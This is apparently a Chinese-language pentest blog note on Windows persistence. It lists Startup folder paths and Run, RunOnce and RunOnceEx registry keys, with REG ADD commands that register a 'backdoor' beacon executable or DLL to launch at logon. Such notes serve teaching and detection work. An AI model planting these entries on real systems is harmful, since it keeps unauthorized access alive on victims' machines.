---
title: Persistence Registry Run Keys
date: 2023-09-13T17:15:29+08:00
draft: false
url: /posts/2023-09-13/Registry-Run-Keys
tags:
  - Windows
  - Persistence
  - Registry-Run-Keys
---

## 0x00 前言

Persistence Registry Run Keys

## 0x01 Registry Run Keys

### 开始菜单启动项

将后门程序放到上面的用户目录中，目标用户重新登录时便会启动后门程序

```cmd
# 当前用户目录  
%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 系统目录（需要管理员权限）  
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### 注册表启动项

```cmd
# 当前用户键值  
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

# 服务器键值 管理员权限
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

### RunOnce 注册键

用户登录时，所有程序按顺序自动执行，在 Run 启动项之前执行，但只能运行一次，执行完毕后会自动删除；用户重新登录时，便会启动后门程序

```cmd
# Usage
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "<name>" /t REG_SZ /F /D "<path to executable>"

REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\beacon.exe"
```

### 其他

```cmd
# executable 管理员权限
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001

# dll 管理员权限
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend

# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v Pentestlab /t REG_SZ /d "C:\tmp\beacon.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v Pentestlab /t REG_SZ /d "C:\tmp\beacon.dll"
```
